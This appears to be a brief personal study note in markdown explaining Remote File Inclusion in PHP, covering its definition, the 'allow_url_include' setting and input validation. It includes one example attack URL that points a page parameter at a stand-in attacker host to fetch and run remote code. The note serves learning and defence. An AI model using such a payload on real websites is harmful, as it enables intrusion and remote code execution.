---
share: true
---
```markdown
# Note: Remote File Inclusion (RFI) Vulnerability

## Definition

- **Remote File Inclusion (RFI)** is a vulnerability that allows an attacker to include a file from a remote server (not the same server as the web application).
- This can lead to remote code execution, data theft, or further compromise of the server.

## How RFI is Exploited

- The attacker modifies a parameter (often in the URL) to include a file hosted on another server.
- Example of a vulnerable URL parameter:
  ```
  http://target-site.com/?page=http://attacker.com/malicious.txt
  ```
- If the application is vulnerable, it will fetch and execute the remote file.

## Tips

- RFI is often possible when `allow_url_include` and `allow_url_fopen` are enabled in the PHP configuration.
- Attackers can use RFI to execute malicious scripts, web shells, or steal sensitive data.
- Always validate and sanitize user input, and restrict file inclusion to local files only.

---

**Summary:**  
RFI allows attackers to include and execute files from remote servers by manipulating file path parameters, leading to serious security risks like remote code execution.

```